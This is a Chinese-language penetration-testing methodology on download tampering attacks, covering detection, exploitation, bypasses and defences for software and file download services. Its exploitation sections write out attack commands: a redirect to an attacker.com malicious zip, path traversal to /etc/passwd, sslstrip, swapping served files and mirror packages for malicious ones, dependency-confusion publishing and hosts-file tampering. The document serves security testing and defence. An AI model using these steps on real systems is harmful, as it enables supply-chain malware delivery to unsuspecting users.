# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化、可复现的下载篡改攻击（Download Tampering）测试与利用流程。通过本方法论，测试人员能够系统性地检测和利用软件/文件下载过程中的完整性漏洞，包括下载链接劫持、文件替换、中间人攻击、镜像源投毒等技术。

## 1.2 适用范围

本文档适用于以下场景：
- 软件下载站点
- 文件分享平台
- 应用商店/包仓库
- 文档/资料库下载
- 固件/驱动下载
- 镜像源/仓库镜像

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行供应链安全评估的顾问
- 负责下载服务安全的技术人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：下载篡改攻击

### 2.1 技术介绍

下载篡改攻击（Download Tampering）是针对文件下载过程的攻击，攻击者通过篡改下载链接、替换下载文件、劫持下载流量等手段，使用户下载到恶意文件而非预期内容。

**攻击原理：**
- **下载链接劫持：** 修改下载链接指向恶意文件
- **文件替换：** 在服务器端或传输过程中替换文件
- **中间人攻击：** 在下载过程中篡改传输内容
- **镜像源投毒：** 污染镜像仓库中的文件
- **DNS 劫持：** 将下载请求重定向到恶意服务器
- **CDN 投毒：** 污染 CDN 缓存中的文件

**本质：** 下载过程缺乏完整性验证机制，用户无法确认下载文件的真实性和完整性。

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **软件下载站** | 应用程序下载 | 下载链接被篡改为恶意软件 |
| **开源镜像站** | npm/PyPI/Maven 镜像 | 镜像源被投毒 |
| **应用商店** | 移动应用下载 | 应用被替换为恶意版本 |
| **文档平台** | PDF/Office 文档下载 | 文档内容被篡改 |
| **固件下载** | 设备固件更新 | 固件被植入后门 |
| **驱动下载** | 硬件驱动程序 | 驱动被植入恶意代码 |
| **游戏分发** | 游戏客户端下载 | 游戏被植入作弊/恶意代码 |
| **企业内部** | 内部工具/脚本下载 | 内部资源被替换 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**下载流程分析：**

1. **识别下载机制**
   ```bash
   # 检查下载链接
   # - 直接下载：/download/file.zip
   # - 重定向下载：/redirect?url=...
   # - 动态生成：/api/download?id=123
   
   # 检查是否有完整性校验
   # - 是否提供哈希值（MD5/SHA1/SHA256）
   # - 是否有数字签名
   ```

2. **测试下载链接劫持**
   ```bash
   # 检查下载响应
   curl -I https://target.com/download/software.exe
   
   # 检查重定向
   curl -v https://target.com/download?id=123
   
   # 检查 Host 头影响
   curl -H "Host: evil.com" https://target-ip/download/file.zip
   ```

3. **测试中间人攻击**
   ```bash
   # 检查是否使用 HTTPS
   # 检查证书有效性
   openssl s_client -connect target.com:443
   
   # 测试 HTTP 降级
   curl http://target.com/download/file.zip
   ```

#### 2.3.2 白盒测试

**代码审计要点：**

1. **检查下载实现**
   ```python
   # 危险模式：无验证的文件下载
   @app.route('/download/<filename>')
   def download(filename):
       return send_file(f'/storage/{filename}')
   
   # 安全模式：验证文件完整性
   @app.route('/download/<filename>')
   def download(filename):
       file = get_file(filename)
       if not verify_hash(file, file.expected_hash):
           raise Exception("File integrity check failed")
       return send_file(file)
   ```

2. **检查存储配置**
   ```python
   # 危险模式：用户可上传覆盖
   @app.route('/upload', methods=['POST'])
   def upload():
       file = request.files['file']
       file.save(f'/public/{file.filename}')  # 可覆盖现有文件
   ```

### 2.4 漏洞利用方法

#### 2.4.1 下载链接劫持

**方法 1：参数篡改**
```bash
# 原始下载链接
https://target.com/download?id=123&file=software.exe

# 篡改参数
https://target.com/download?id=124&file=malicious.exe

# 或路径遍历
https://target.com/download?file=../../../etc/passwd
```

**方法 2：重定向劫持**
```bash
# 如果下载使用重定向
https://target.com/redirect?url=https://cdn.target.com/file.zip

# 篡改为恶意链接
https://target.com/redirect?url=https://attacker.com/malicious.zip
```

#### 2.4.2 文件替换攻击

**方法 1：上传覆盖**
```bash
# 如果系统允许上传覆盖
curl -X POST https://target.com/upload \
  -F "file=@malicious.exe" \
  -F "filename=legitimate.exe"
```

**方法 2：服务器入侵**
```bash
# 入侵服务器后替换文件
ssh compromised-server
mv /var/www/downloads/software.exe /var/www/downloads/software.exe.bak
cp malicious.exe /var/www/downloads/software.exe
```

#### 2.4.3 中间人攻击

**HTTP 降级攻击：**
```bash
# 如果站点同时支持 HTTP 和 HTTPS
# 强制用户使用 HTTP
# 使用 ARP 欺骗或 DNS 劫持

# 劫持后替换下载文件
mitmproxy --mode transparent
# 配置替换规则
```

**SSL 剥离：**
```bash
# 使用 sslstrip 工具
sslstrip -a -k -l 8080
# 将 HTTPS 连接降级为 HTTP
```

#### 2.4.4 镜像源投毒

**方法 1：污染公共镜像**
```bash
# 向公共镜像仓库提交恶意包
# 如 npm、PyPI 等

npm publish malicious-package
# 如果包名与内部包相同，可能被下载
```

**方法 2：入侵镜像服务器**
```bash
# 获取镜像服务器权限后
# 修改镜像仓库中的文件

# 替换包文件
mv /mirror/npm/packages/legitimate-1.0.0.tgz backup.tgz
cp malicious-1.0.0.tgz /mirror/npm/packages/legitimate-1.0.0.tgz
```

#### 2.4.5 DNS 劫持

**方法 1：DNS 缓存投毒**
```bash
# 污染 DNS 缓存
# 使 download.target.com 解析到攻击者 IP

# 需要控制 DNS 服务器或进行中间人攻击
```

**方法 2：Hosts 文件篡改**
```bash
# 如果有权限修改客户端 hosts
echo "192.168.1.100 download.target.com" >> /etc/hosts
```

#### 2.4.6 信息收集命令

```bash
# 收集下载服务器信息
curl -I https://target.com/download/file.zip

# 检查文件哈希
curl https://target.com/download/file.zip | sha256sum

# 检查证书
openssl s_client -connect target.com:443 -servername target.com

# 检查 DNS 记录
dig download.target.com
dig +short download.target.com
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过哈希验证

**方法 1：哈希碰撞**
```bash
# 对于使用 MD5/SHA1 的系统
# 可以使用碰撞攻击

# 使用 HashClash 生成 MD5 碰撞
hashclash original.bin malicious.bin
# 两个文件有相同的 MD5 哈希
```

**方法 2：利用验证缺陷**
```python
# 如果哈希验证逻辑有缺陷
if user_hash in expected_hash:  # 子串匹配
    return True
# 可以构造包含有效哈希的请求
```

#### 2.5.2 绕过签名验证

**方法 1：移除签名文件**
```bash
# 如果签名文件单独存储
# 可以删除签名文件使验证跳过

rm file.zip.sig
# 如果系统无签名时不验证，则绕过
```

**方法 2：利用弱签名算法**
```bash
# 如果签名使用弱算法
# 可以伪造签名
```

#### 2.5.3 绕过 CDN 缓存

**方法 1：缓存绕过**
```bash
# 添加随机参数绕过 CDN 缓存
curl "https://cdn.target.com/file.zip?_t=$(date +%s)"
```

**方法 2：缓存投毒**
```bash
# 先请求恶意文件使其被缓存
curl "https://cdn.target.com/file.zip?param=malicious"
# 如果缓存键配置不当，可能影响正常下载
```

#### 2.5.4 持久化技术

**DNS 持久化：**
```bash
# 修改 DNS 记录指向恶意服务器
# TTL 内持续有效
```

**服务器后门：**
```bash
# 在下载服务器植入后门
# 持续提供恶意文件
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|------------|------|
| **路径遍历** | 文件读取 | `../../../etc/passwd` | 读取敏感文件 |
| **参数篡改** | 下载 ID | `?id=1` instead of `?id=100` | 访问他人文件 |
| **重定向劫持** | URL 参数 | `?url=http://attacker.com/mal.zip` | 重定向到恶意链接 |
| **哈希碰撞** | MD5 验证 | 使用 HashClash 生成碰撞 | 绕过 MD5 验证 |
| **HTTP 降级** | HTTPS 站点 | 强制 HTTP 连接 | 中间人攻击 |

## 3.2 常见哈希算法安全性

| 算法 | 安全性 | 建议 |
|-----|--------|------|
| **MD5** | 已破解 | 不应使用 |
| **SHA1** | 已破解 | 不应使用 |
| **SHA256** | 安全 | 推荐使用 |
| **SHA384** | 安全 | 推荐使用 |
| **SHA512** | 安全 | 推荐使用 |
| **BLAKE3** | 安全 | 推荐使用 |

## 3.3 下载安全检查清单

- [ ] 下载使用 HTTPS
- [ ] 提供文件哈希值（SHA256+）
- [ ] 有数字签名验证
- [ ] 下载链接有访问控制
- [ ] 文件存储有完整性保护
- [ ] 镜像源有同步验证
- [ ] CDN 缓存有更新机制
- [ ] 下载日志记录完整
- [ ] 有异常下载检测
- [ ] 有防篡改监控

## 3.4 防御建议

1. **HTTPS 强制**：所有下载必须使用 HTTPS
2. **完整性校验**：提供并验证强哈希值（SHA256+）
3. **代码签名**：对可执行文件进行数字签名
4. **访问控制**：下载链接实施适当的访问控制
5. **文件保护**：存储层实施写保护和监控
6. **镜像验证**：镜像源定期验证文件完整性
7. **CDN 安全**：正确配置 CDN 缓存和源站验证
8. **监控告警**：监控下载异常和文件变更
9. **用户教育**：教育用户验证下载文件完整性
10. **多源验证**：从多个独立源验证文件完整性
